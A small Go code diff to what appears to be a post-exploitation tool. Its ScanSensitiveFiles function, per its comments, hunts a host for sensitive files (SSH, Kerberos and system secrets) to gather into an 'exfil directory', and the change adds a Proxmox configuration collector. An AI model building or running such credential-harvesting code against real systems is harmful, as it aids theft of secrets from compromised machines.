@@ -1,4 +1,5 @@
 package internals
+
 import (
 	"fmt"
 	"os"
@@ -30,13 +31,11 @@ func expandPath(path string) []string {
 	return fileList
 }
 
-
-
 // Function takes in the full path of our exfil directory, and an array of user home directories
 // and then will begin hunting for senitive files. Additionally function takes in bool if we are running
 // as the root user, if we are, easy to determine which files we can collect
 //
-// Return: []string, error -> returns an array of sensitive files found on the system 
+// Return: []string, error -> returns an array of sensitive files found on the system
 func ScanSensitiveFiles(outputDir string, usersHome []string, isRoot bool) []string {
 	// our array of sensitive files
 	var files []string
@@ -71,9 +70,11 @@ func ScanSensitiveFiles(outputDir string, usersHome []string, isRoot bool) []str
 		paths = append(paths, SshSystemCollector()...)
 		paths = append(paths, KerberosCollector()...)
 		paths = append(paths, MiscSystemCollector()...)
+		// Proxmox collector
+		paths = append(paths, ProxmoxConfigCollector()...)
 
 	}
-		
+
 	// add all the found secret files to our files array
 	for _, path := range paths {
 		files = append(files, expandPath(path)...)
@@ -82,4 +83,3 @@ func ScanSensitiveFiles(outputDir string, usersHome []string, isRoot bool) []str
 	return files
 
 }
-
